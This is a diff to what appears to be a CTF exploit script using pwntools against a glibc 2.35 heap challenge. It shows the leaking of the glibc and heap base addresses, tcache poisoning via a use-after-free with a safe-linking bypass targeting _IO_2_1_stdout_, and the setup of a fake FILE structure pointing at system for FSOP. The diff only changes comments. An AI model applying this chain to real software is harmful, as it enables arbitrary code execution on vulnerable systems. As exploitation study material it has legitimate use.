@@ -43,7 +43,7 @@ log.info(f"glibc base address: {hex(glibc_base_addr)}")
 heap_base_addr = ((u64(view(0).ljust(8, b'\x00'))<<12)^0)&~0xfff
 log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Stage 3: tcache poisoning
+# Stage 3: tcache poisoning to trigger FSOP
 glibc_e = ELF('./libc-2.35.so')
 malloc(10, 0xf8)
 # chunk in position 6 and 10 are the same, UAF available
@@ -51,8 +51,6 @@ free(6)
 write(10, p64((glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])^((heap_base_addr+0x8a0)>>12)))
 malloc(11, 0xf8)
 malloc(12, 0xf8)
-
-# Stage 4: FSOP
 fake = FileStructure(0)
 fake.flags = 0x3b01010101010101
 fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
